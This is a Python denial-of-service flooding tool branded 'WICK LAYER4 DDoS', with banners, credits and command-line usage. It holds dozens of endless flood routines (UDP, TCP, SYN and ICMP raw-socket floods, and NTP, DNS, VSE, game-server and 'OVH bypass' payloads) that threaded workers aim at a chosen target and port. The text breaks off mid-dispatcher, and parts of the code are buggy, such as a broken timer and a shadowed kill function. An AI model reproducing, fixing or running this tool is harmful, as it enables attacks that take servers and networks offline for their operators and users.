from socket import socket , AF_INET , SOCK_STREAM , SOCK_DGRAM , SOCK_RAW , IPPROTO_ICMP , IPPROTO_TCP , IPPROTO_UDP , IP_HDRINCL , IPPROTO_IP
from threading import Thread as thr
from sys import argv
from os import system , name , getpid , kill
from colorama import Fore , init
from time import time , sleep
from random import randint , _urandom
from codecs import decode as cdec
from struct import pack

init()

red = Fore.LIGHTRED_EX; green = Fore.LIGHTGREEN_EX; blue = Fore.LIGHTBLUE_EX; yellow = Fore.LIGHTYELLOW_EX; cyan = Fore.LIGHTCYAN_EX; white = Fore.LIGHTWHITE_EX; magenta = Fore.LIGHTMAGENTA_EX;

system('cls' if name == 'nt' else 'clear')

banner = f'''
      {cyan} _   _   _   _     _   _   _   _   _   _     _   _   _   _  
      {cyan}/ \ / \ / \ / \   / \ / \ / \ / \ / \ / \   / \ / \ / \ / \ 
     {cyan}( {green}W{cyan} | {green}I{cyan} | {green}C{cyan} | {green}K{cyan} ) ( {blue}L{cyan} | {blue}A{cyan} | {blue}Y{cyan} | {blue}E{cyan} | {blue}R{cyan} | {red}4{cyan} ) ( {yellow}V{cyan} | {yellow}1{cyan} | {red}.{cyan} | {yellow}0{cyan} )
      {cyan}\_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ 

    {cyan}╔══════════════════════════════════════════════════════════════════════════╗
    {cyan}║ {red}• {green}Created By  {red}: {blue}#{yellow}John_Wick {red}•{cyan}                                             ║
    {cyan}║ {red}• {green}Created For {red}: {cyan}mwmd01 {red}& {yellow}Quartz {blue}Family {red}•{cyan}                                 ║
    {cyan}║ {red}• {green}Commands {red}: {green}layer{blue}4 {red}|| {white}python{magenta}3 {cyan}flood{red}.{blue}py {green}layer{blue}4 {red}•{cyan}                         ║
    {cyan}║ {red}• {green}How Run {red}? {white}flood{red}.{cyan}py {yellow}<{red}method{yellow}> <{blue}target{yellow}> <{green}port{yellow}> <{cyan}threads{yellow}> <{blue}rpc{yellow}> <{magenta}time{yellow}> {red}•{cyan}   ║
    {cyan}║ {red}• {green}Welcome {yellow}To {blue}The {red}WICK {green}LAYER{blue}4 {cyan}DDoS {red}•{cyan}                                      ║
    {cyan}╚══════════════════════════════════════════════════════════════════════════╝
'''

layer4 = f'''

      {cyan} _   _   _   _     _   _   _   _   _   _     _   _   _   _  
      {cyan}/ \ / \ / \ / \   / \ / \ / \ / \ / \ / \   / \ / \ / \ / \ 
     {cyan}( {green}W{cyan} | {green}I{cyan} | {green}C{cyan} | {green}K{cyan} ) ( {blue}L{cyan} | {blue}A{cyan} | {blue}Y{cyan} | {blue}E{cyan} | {blue}R{cyan} | {red}4{cyan} ) ( {yellow}V{cyan} | {yellow}1{cyan} | {red}.{cyan} | {yellow}0{cyan} )
      {cyan}\_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ 

                {cyan}╔═══════════════════════════════════╗
                {cyan}║                                   {cyan}║
                {cyan}║ {red}• {green} UDP                            {cyan}║
                {cyan}║ {red}• {green} TCP                            {cyan}║
                {cyan}║ {red}• {green} GUDP                           {cyan}║
                {cyan}║ {red}• {green} SYN                            {cyan}║
                {cyan}║ {red}• {green} GTCP                           {cyan}║
                {cyan}║ {red}• {green} VSE                            {cyan}║
                {cyan}║ {red}• {green} NTP                            {cyan}║
                {cyan}║ {red}• {green} ICMP                           {cyan}║
                {cyan}║ {red}• {green} MP4                            {cyan}║
                {cyan}║ {red}• {green} TELNET                         {cyan}║
                {cyan}║ {red}• {green} MTA                            {cyan}║
                {cyan}║ {red}• {green} OVH-TCP                        {cyan}║
                {cyan}║ {red}• {green} OVH-UDP                        {cyan}║
                {cyan}║                                   {cyan}║
                {cyan}║ {red}• {blue} Created {yellow}By {green}Yasin {red}BM            {cyan}║
                {cyan}╚═══════════════════════════════════╝

'''

print(banner)

try:
    if argv[1] == 'layer4':
        system('cls' if name == 'nt' else 'clear')
        print(layer4)
except:
    pass


try:
    method = argv[1]
    target = argv[2]
    port = int(argv[3])
    threads = int(argv[4])
    rpc = int(argv[5])
    timme = int(argv[6])
except:
    pass

def timer():
    try:
        sleep(time); kill(getpid(), 9)
    except:
        pass

def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i + 1])
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = s + (s >> 16)
    s = ~s & 0xffff
    return s

def udp():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = _urandom(1024)
                s.sendto(payl , (target , port))
        except:
            pass

def tcp():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            s.connect((target,port))
            for _ in range(rpc):
                payl = _urandom(1024)
                s.sendto(payl)
        except:
            pass

def gudp():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\00\x00'
                s.sendto(payl , (target , port))
        except:
            pass

def syn():
    while True:
        try:
            s = socket(AF_INET , SOCK_RAW , IPPROTO_TCP)
            s.setsockopt(IPPROTO_IP , IP_HDRINCL , 1)
            for _ in range(rpc):
                payl = ('\x00' * randint(1 , 128)).encode()
                s.sendto(payl , (target , port))
        except:
            pass

def mp4():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44\x83\xc8\x8d\x51\x45\x6f\x90\x95\x23\x3e\x00\x97\x2b\x1c\x71\xb2\x4e\xc0\x61\xf1\xd7\x6f\xc5\x7e\xf6\x48\x52\xbf\x82\x6a\xa2\x3b\x65\xaa\x18\x7a\x17\x38\xc3\x81\x27\xc3\x47\xfc\xa7\x35\xba\xfc\x0f\x9d\x9d\x72\x24\x9d\xfc\x02\x17\x6d\x6b\xb1\x2d\x72\xc6\xe3\x17\x1c\x95\xd9\x69\x99\x57\xce\xdd\xdf\x05\xdc\x03\x94\x56\x04\x3a\x14\xe5\xad\x9a\x2b\x14\x30\x3a\x23\xa3\x25\xad\xe8\xe6\x39\x8a\x85\x2a\xc6\xdf\xe5\x5d\x2d\xa0\x2f\x5d\x9c\xd7\x2b\x24\xfb\xb0\x9c\xc2\xba\x89\xb4\x1b\x17\xa2\xb6'
                s.sendto(payl , (target , port))
        except:
            pass

def gtcp():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            s.connect((target,port))
            for _ in range(rpc):
                payl = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44\x83\xc8\x8d\x51\x45\x6f\x90\x95\x23\x3e\x00\x97\x2b\x1c\x71\xb2\x4e\xc0\x61\xf1\xd7\x6f\xc5\x7e\xf6\x48\x52\xbf\x82\x6a\xa2\x3b\x65\xaa\x18\x7a\x17\x38\xc3\x81\x27\xc3\x47\xfc\xa7\x35\xba\xfc\x0f\x9d\x9d\x72\x24\x9d\xfc\x02\x17\x6d\x6b\xb1\x2d\x72\xc6\xe3\x17\x1c\x95\xd9\x69\x99\x57\xce\xdd\xdf\x05\xdc\x03\x94\x56\x04\x3a\x14\xe5\xad\x9a\x2b\x14\x30\x3a\x23\xa3\x25\xad\xe8\xe6\x39\x8a\x85\x2a\xc6\xdf\xe5\x5d\x2d\xa0\x2f\x5d\x9c\xd7\x2b\x24\xfb\xb0\x9c\xc2\xba\x89\xb4\x1b\x17\xa2\xb6'
                s.send(payl)
        except:
            pass

def vse():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
                s.sendto(payl , (target , port))
        except:
            pass

def telnet():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b'\xff\xfb\x25\xff\xfd\x26\xff\xfb\x26\xff\xfd\x03\xff\xfb\x18\xff\xfb\x1f\xff\xfb\x20\xff\xfb\x21\xff\xfb\x22\xff\xfb\x27\xff\xfd\x05'
                s.sendto(payl , (target , port))
        except:
            pass

def ntp():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b'\x17\x00\x03\x2a\x00\x00\x00\x00'
                s.sendto(payl , (target , port))
        except:
            pass

def icmp():
    while True:
        try:
            s = socket(AF_INET , SOCK_RAW , IPPROTO_ICMP)
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            for _ in range(rpc):
                payl = b"\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65\x66\x67\x68\x69"
                s.sendto(payl , (target , port))
        except:
            pass

def mta():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                if port == 7796:
                    payl = cdec("081e62da","hex_codec")
                elif port == 7777:
                    payl = cdec("081e77da","hex_codec")
                elif port == 7771:
                    payl = cdec("081e4dda","hex_codec")
                elif port == 7784:
                    payl = cdec("021efd40","hex_codec")
                elif port == 1111:
                    payl = cdec("021efd40","hex_codec")
                else:
                    payl = cdec("081e77da","hex_codec")
                s.sendto(payl , (target , port))
        except:
            pass

def ovh_tcp():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            s.connect((target,port))
            for _ in range(rpc):
                payl = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44\x83\xc8\x8d\x51\x45\x6f\x90\x95\x23\x3e\x00\x97\x2b\x1c\x71\xb2\x4e\xc0\x61\xf1\xd7\x6f\xc5\x7e\xf6\x48\x52\xbf\x82\x6a\xa2\x3b\x65\xaa\x18\x7a\x17\x38\xc3\x81\x27\xc3\x47\xfc\xa7\x35\xba\xfc\x0f\x9d\x9d\x72\x24\x9d\xfc\x02\x17\x6d\x6b\xb1\x2d\x72\xc6\xe3\x17\x1c\x95\xd9\x69\x99\x57\xce\xdd\xdf\x05\xdc\x03\x94\x56\x04\x3a\x14\xe5\xad\x9a\x2b\x14\x30\x3a\x23\xa3\x25\xad\xe8\xe6\x39\x8a\x85\x2a\xc6\xdf\xe5\x5d\x2d\xa0\x2f\x5d\x9c\xd7\x2b\x24\xfb\xb0\x9c\xc2\xba\x89\xb4\x1b\x17\xa2\xb6'
                s.sendto(payl , (target , port))
        except:
            pass

def ovh_udp():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44\x83\xc8\x8d\x51\x45\x6f\x90\x95\x23\x3e\x00\x97\x2b\x1c\x71\xb2\x4e\xc0\x61\xf1\xd7\x6f\xc5\x7e\xf6\x48\x52\xbf\x82\x6a\xa2\x3b\x65\xaa\x18\x7a\x17\x38\xc3\x81\x27\xc3\x47\xfc\xa7\x35\xba\xfc\x0f\x9d\x9d\x72\x24\x9d\xfc\x02\x17\x6d\x6b\xb1\x2d\x72\xc6\xe3\x17\x1c\x95\xd9\x69\x99\x57\xce\xdd\xdf\x05\xdc\x03\x94\x56\x04\x3a\x14\xe5\xad\x9a\x2b\x14\x30\x3a\x23\xa3\x25\xad\xe8\xe6\x39\x8a\x85\x2a\xc6\xdf\xe5\x5d\x2d\xa0\x2f\x5d\x9c\xd7\x2b\x24\xfb\xb0\x9c\xc2\xba\x89\xb4\x1b\x17\xa2\xb6'
                s.sendto(payl , (target , port))
        except:
            pass

def fivem_tcp():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            for _ in range(rpc):
                payl = b'\x74\x6f\x6b\x65\x6e\x3d\x64\x66\x39\x36\x61\x66\x30\x33\x2d\x63\x32\x66\x63\x2d\x34\x63\x32\x39\x2d\x39\x31\x39\x61\x2d\x32\x36\x30\x35\x61\x61\x37\x30\x62\x31\x66\x38\x26\x67\x75\x69\x64\x3d\x37\x36\x35\x36\x31\x31\x39\x38\x38\x30\x34\x38\x30\x36\x30\x31\x35'
                s.sendto(payl , (target , port))
        except:
            pass

def fivem_udp():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
                s.sendto(payl , (target , port))
        except:
            pass

def csgo_tcp():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            for _ in range(rpc):
                payl = b'\xff\xff\xff\xff\x71\x63\x6f\x6e\x6e\x65\x63\x74\x30\x78\x30\x30\x30\x30\x30\x30\x30\x30\x00'
                s.send(payl , (target , port))
        except:
            pass

def csgo_udp():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b'\xff\xff\xff\xff\x71\x63\x6f\x6e\x6e\x65\x63\x74\x30\x78\x30\x30\x30\x30\x30\x30\x30\x30\x00'
                s.send(payl , (target , port))
        except:
            pass

def cs1_6():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b'\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x73\x74\x65\x61\x6d\x0a'
                s.sendto(payl , (target , port))
        except:
            pass

def udpb():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = (b'\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x02\xfd\x66\xd3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
                s.sendto(payl , (target , port))
        except:
            pass

def ts3():
    while True:
        try:
            s = socket(AF_INET , SOCK_RAW , IPPROTO_TCP)
            s.setsockopt(IPPROTO_IP , IP_HDRINCL , 1)
            for _ in range(rpc):
                payl = b'\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x0c\x26\x87\xdd\x00\x5d\x36\xdb\xe3\xae\xa9\xc3\x8d\x00\x00\x00\x00\x00\x00\x00\x00'
                s.sendto(payl , (target , port))
        except:
            pass

def tcp_80():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            s.connect((target,port))
            for _ in range(rpc):
                payl = b'\x0e\x00\x00\x00\x00\x00\x00\x00\x00'
                s.send(payl)
        except:
            pass

def tcp_443():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            s.connect((target,port))
            for _ in range(rpc):
                payl = b'\x01\x00\x00\x00\x00\x00\x00\x00\x00'
                s.send(payl)
        except:
            pass

def tcp_rdp():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            s.connect((target,port))
            for _ in range(rpc):
                payl = b'\x00\x0b\x00\x00\x00'
                s.send(payl)
        except:
            pass

def udp_rdp():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00'
                s.sendto(payl , (target , port))
        except:
            pass

def amp():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b'\x02\x04\x05\xb4\x04\x02\x08\x0a\x00\xd9\x68\xa3\x00\x00\x00\x00\x01\x03\x03\x07\xfe\x04\xf9\x89'
                s.sendto(payl , (target , port))
        except:
            pass

def dns():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07\x65\x78\x61\x6d\x70\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01'
                s.sendto(payl , (target , port))
        except:
            pass

def ssh():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            s.connect((target,port))
            for _ in range(rpc):
                payl = b'\x48\x65\x6C\x6C\x6F\x20\x57\x6F\x72\x6C\x64'
                s.send(payl)
        except:
            pass

def non_tcp():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            s.connect((target,port))
            for _ in range(rpc):
                payl = b'\xa0\xab\x1b\xbd\x0d\xbe\xd0\x39\x57\xc1\xc4\x19\x08\x00\x45\x00'
                s.send(payl)
        except:
            pass

def non_udp():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b'\x00\x01\x02\x03'
                s.sendto(payl , (target , port))
        except:
            pass

def hetz():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b'\x00\x11\x22\x33\x44\x55\x66\x77\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\xA4\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x98\x01\x01\x00\x04\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x01\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x03\x01\x00\x00\x80\x01\x00\x01\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01'
                s.sendto(payl , (target , port))
        except:
            pass

def tcpplus():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            s.connect((target,port))
            for _ in range(rpc):
                payl = b'\xa0\xab\x1b\xbd'
                s.send(payl)
        except:
            pass

def ovh_kill():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00'
                s.sendto(payl , (target , port))
        except:
            pass

def kill():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b"\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45"
                s.sendto(payl , (target , port))
        except:
            pass

def blood():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
                s.sendto(payl , (target , port))
        except:
            pass

def mine_udp():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = ("\x00\x00"*randint(1024 , 2048))
                s.sendto(payl , (target , port))
        except:
            pass

def mine_tcp():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            s.connect((target , port))
            for _ in range(rpc):
                payl = b"\x00\x01"
                s.send(payl)
        except:
            pass

def vseplus():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b"\xFF\xFF\xFF\xFF\x55\x4B\xA1\xD5\x22"
                s.sendto(payl , (target , port))
        except:
            pass

def tcp_kill():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            s.connect((target , port))
            for _ in range(rpc):
                payl = b"\x02\x04\x05\xb4\x04\x02\x08\x0a\x00\xd9\x68\xa3\x00\x00\x00\x00\x01\x03\x03\x07\xfe\x04\xf9\x89"
                s.send(payl)
        except:
            pass
    
def udp_kill():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b"\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x02\xfd\x66\xd3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                s.sendto(payl , (target , port))
        except:
            pass

def rip_udp():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10"
                s.sendto(payl , (target , port))
        except:
            pass

def rip_tcp():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            s.connect((target , port))
            for _ in range(rpc):
                payl = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x21\x00\x02\x00\x00\x00\x00\x00"
                s.send(payl)
        except:
            pass

def udp_53():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b"\xa0\xab\x1b\xbd\x0d\xbe\xd0\x39\x57\xc1\xc4\x19\x08\x00\x45\x00"
                s.sendto(payl , (target , port))
        except:
            pass

def tcp_22():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            s.connect((target , port))
            for _ in range(rpc):
                payl = b"\x0e\x2e\x71\x92\x20\x48"
                s.send(payl)
        except:
            pass

def udp_legend():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b"\x77\x61\x62\x63\x64\x65\x66\x67\x68\x69"
                s.sendto(payl , (target , port))
        except:
            pass

def vpn_tcp():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            s.connect((target , port))
            for _ in range(rpc):
                payl = b"\x00\x00\xd0\xd6\x00\x00"
                s.send(payl)
        except:
            pass

def vpn_udp():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b"\x00\x00\xd0\xd6\x00\x00"
                s.sendto(payl , (target , port))
        except:
            pass

def tcp_pps():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            s.connect((target , port))
            for _ in range(rpc):
                payl = b"\x2c\x1c\x98\xff\x61\x7f\x1a\xf8\x4c\x39\x1a\x35\xdd\xe4\xa6\xbe\x75\x76\x38\xf3\x85\x3d\x7d\xbb\x00\x00\x00\x00\x00\x00\x00\x00"
                s.send(payl)
        except:
            pass

def tcp_damage():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            s.connect((target , port))
            for _ in range(rpc):
                payl = b"\x62\x62\x6c\x61\x7a\x69\x6e\x67\x20\x69\x73\x20\x67\x6f\x64\x20\x6c\x6d\x66\x61\x6f\x20\x79\x61\x6c\x6c\x20\x6e\x65\x65\x64\x20\x74\x6f\x20\x67\x65\x74\x20\x6f\x66\x66\x20\x6d\x79\x20\x64\x69\x63\x6b"
                s.send(payl)
        except:
            pass

def udp_pps():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b"\x30\x28\x18\xc5\xa5\x15\xe0\x94\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                s.sendto(payl , (target , port))
        except:
            pass

def udp_damage():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = b"\xe3\x54\x0a\x4f\x6e\x6c\x69\x6e\x65\x47\x61\x6d\x65"
                s.sendto(payl , (target , port))
        except:
            pass

def tcpbypass():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            s.connect((target , port))
            for _ in range(rpc):
                payl = b"\x19\x00\xd4\x02\x12\x33\x31\x2e\x32\x31\x34\x2e\x32\x34\x34\x2e\x31\x39\x00\x46\x4d\x4c\x00\x63\xdd\x01\x01\x00\x11\x22\x33"
                s.send(payl)
        except:
            pass

def clasic():
    while True:
        try:
            s = socket(AF_INET , SOCK_DGRAM)
            for _ in range(rpc):
                payl = _urandom(randint(512, 1024))
                s.sendto(payl , (target , port))
        except:
            pass

def clasic_tcp():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            s.connect((target , port))
            for _ in range(rpc):
                payl = ("\x00\x00" * randint(16 , 32))
                s.send(payl)
        except:
            pass

def test():
    while True:
        try:
            s = socket(AF_INET , SOCK_STREAM)
            s.connect((target , port))
            for _ in range(rpc):
                payl = b"\x31\x30\x32\x34"
                s.send(payl)
        except:
            pass
try:
    print(f'\n  {red}[{yellow}+{red}]{green} Attack Started {red}|| {cyan}{target}{red}:{cyan}{port} {red}|| {blue}Methods{red} : {green}{method}')
except:
    pass

thr(target=timer).start()

try:
    if method == 'udp':
        for _ in range(threads):
            thr(target=udp).start()
    elif method == 'tcp':
        for _ in range(threads):
            thr(target=tcp).start()
    elif method == 'gudp':
        for _ in range(threads):
            thr(target=gudp).start()
    elif method == 'syn':
        for _ in range(threads):
            thr(target=syn).start()
    elif method == 'tcp':
        for _ in range(threads):
            thr(target=tcp).start()
    elif method == 'mp4':
        for _ in range(threads):
            thr(target=mp4).start()
    elif method == 'gtcp':
        for _ in range(threads):
            thr(target=gtcp).start()
    elif method == 'vse':
        for _ in range(threads):
            thr(target=vse).start()
    elif method == 'telnet':
        for _ in range(threads):
            thr(target=telnet).start()
    elif method == 'ntp':
        for _ in range(threads):
            thr(target=ntp).start()
    elif method == 'icmp':
        for _ in range(threads):
            thr(target=icmp).start()
    elif method == 'mta':
        for _ in range(threads):
            thr(target=mta).start()
    elif method == 'ovh-tcp':
        for _ in range(threads):
            thr(target=ovh_tcp).start()
    elif method == 'ovh-udp':
        for _ in range(threads):
            thr(target=ovh_udp).start()
    elif method == 'fivem-udp':
        for _ in range(threads):
            thr(target=fivem_udp).start()
    elif method == 'fivem-tcp':
        for _ in range(threads):
            thr(target=fivem_tcp).start()
    elif method == 'csgo-tcp':
        for _ in range(threads):
            thr(target=csgo_tcp).start()
    elif method == 'csgo-udp':
        for _ in range(threads):
            thr(target=csgo_udp).start()
    elif method == 'cs1.6':
        for _ in range(threads):
            thr(target=cs1_6).start()
    elif method == 'udp-bypass':
        for _ in range(threads):
            thr(target=udpb).start()
    elif method == 'ts3':
        for _ in range(threads):
            thr(target=ts3).start()
    elif method == 'tcp-80':
        for _ in range(threads):
            thr(target=tcp_80).start()
    elif method == 'tcp-443':
        for _ in range(threads):
            thr(target=tcp_443).start()
    elif method == 'tcp-rdp':
        for _ in range(threads):
            thr(target=tcp_rdp).start()
    elif method == 'udp-rdp':
        for _ in range(threads):
            thr(target=udp_rdp).start()
    elif method == 'amp':
        for _ in range(threads):
            thr(target=amp).start()
    elif method == 'dns':
        for _ in range(threads):
            thr(target=dns).start()
    elif method == 'ssh':
        for _ in range(threads):
            thr(target=ssh).start()
    elif method == 'non-tcp':
        for _ in range(threads):
            thr(target=non_tcp).start()
    elif method == 'non-udp':
        for _ in range(threads):
            thr(target=non_udp).start()
    elif method == 'heat':
        for _ in range(threads):
            thr(target=hetz).start()
    elif method == 'tcp+':
        for _ in range(threads):
            thr(target=tcpplus).start()
    elif method == 'ovh-kill':
        for _ in range(threads):
            thr(target=ovh_kill).start()
    elif method == 'kill':
        for _ in range(threads):
            thr(target=kill).start()
    elif method == 'blood':
        for _ in range(threads):
            thr(target=blood).start()
    elif method == 'mine-udp':
        for _ in range(threads):
            thr(target=mine_udp).start()
    elif method == 'mine-tcp':
        for _ in range(threads):
            thr(target=mine_tcp).start()
    elif method == 'vse+':
        for _ in range(threads):
            thr(target=vseplus).start()
    elif method == 'tcp-kill':
        for _ in range(threads):
            thr(target=tcp_kill).start()
    elif method == 'udp-kill':
        for _ in range(threads):
            thr(target=udp_kill).start()
    elif method == 'rip-udp':
        for _ in range(threads):
            thr(target=rip_udp).start()
    elif method == 'rip-tcp':
